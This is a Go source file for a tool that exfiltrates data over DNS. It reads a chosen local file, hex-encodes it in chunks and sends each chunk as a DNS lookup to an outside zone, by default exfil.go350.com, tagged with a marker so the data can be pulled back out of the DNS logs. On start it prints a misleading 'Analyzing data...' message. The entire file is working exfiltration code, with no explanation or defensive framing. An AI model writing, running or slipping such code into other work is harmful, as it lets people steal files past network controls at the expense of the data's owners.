package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	"io"
	"log"
	"math"
	"net"
	"os"
)

func main() {
	var debug = flag.Bool("d", false, "enable debugging.")
	var file = flag.String("file", "", "the local file to exfiltrate.")
	var help = flag.Bool("help", false, "show help.")
	var marker = flag.String("marker", "jzp", "a unique marker to identify the file in the dns logs.")
	var zone = flag.String("zone", "exfil.go350.com", "the dns zone to send the queries to.")

	flag.Parse()

	if *help || len(os.Args) == 1 {
		flag.PrintDefaults()
		return
	}

	fmt.Printf("Analyzing data...\n")

	// Open the local file
	f, err := os.Open(*file)
	if err != nil {
		log.Fatalln(err)
	}
	defer f.Close()

	// Read file in 90 byte chunks
	dataBytes := make([]byte, 90)

	// Numbers for the file chunks
	chunk := 0

	for {
		dataBytes = dataBytes[:cap(dataBytes)]
		bytesRead, err := f.Read(dataBytes)
		if err != nil {
			if err == io.EOF {
				break
			}
			log.Fatalln(err)
		}

		dataBytes = dataBytes[:bytesRead]
		hexString := hex.EncodeToString(dataBytes)

		if len(hexString) <= 60 {
			// One Label
			hostname := fmt.Sprintf("%d.%s.1.%s.%s", chunk, *marker, hexString, *zone)
			_, err := net.LookupIP(hostname)
			fmt.Printf("%d\n", chunk)
			if *debug {
				fmt.Printf("hostname: %s\n", hostname)
				fmt.Printf("len: %d\n", len(hostname))
				fmt.Printf("err: %s\n", err)
				fmt.Printf("--------------------------\n")
			}
		}

		if len(hexString) > 60 && len(hexString) <= 120 {
			// Two Labels

			firstHalf := len(hexString) / 2
			fh := float64(firstHalf)
			evenOdd := math.Mod(fh, 2)
			if evenOdd == 1 {
				firstHalf = firstHalf + 1
			}

			//fmt.Printf("%d %s\n", len(hexString), hexString[:])
			//fmt.Printf("%d %s\n", len(hexString[0:firstHalf]), hexString[0:firstHalf])
			//fmt.Printf("%d %s\n", len(hexString[firstHalf:]), hexString[firstHalf:])
			//fmt.Printf("%s\n", "---------------------------------------")

			hostname := fmt.Sprintf("%d.%s.2.%s.%s.%s", chunk, *marker, hexString[0:firstHalf], hexString[firstHalf:], *zone)
			_, err := net.LookupIP(hostname)
			fmt.Printf("%d\n", chunk)
			if *debug {
				fmt.Printf("hostname: %s\n", hostname)
				fmt.Printf("len: %d\n", len(hostname))
				fmt.Printf("err: %s\n", err)
				fmt.Printf("--------------------------\n")
			}
		}

		if len(hexString) > 120 && len(hexString) <= 180 {
			// Three Labels

			//fmt.Printf("%d %s\n", len(hexString), hexString[:])
			//fmt.Printf("%d %s\n", len(hexString[0:60]), hexString[0:60])
			//fmt.Printf("%d %s\n", len(hexString[60:120]), hexString[60:120])
			//fmt.Printf("%d %s\n", len(hexString[120:]), hexString[120:])
			//fmt.Printf("%s\n", "---------------------------------------")

			hostname := fmt.Sprintf("%d.%s.3.%s.%s.%s.%s", chunk, *marker, hexString[0:60], hexString[60:120], hexString[120:], *zone)
			_, err := net.LookupIP(hostname)
			fmt.Printf("%d\n", chunk)
			if *debug {
				fmt.Printf("hostname: %s\n", hostname)
				fmt.Printf("len: %d\n", len(hostname))
				fmt.Printf("err: %s\n", err)
				fmt.Printf("--------------------------\n")
			}
		}

		chunk = chunk + 1
	}

	fmt.Printf("Complete.\n")
}
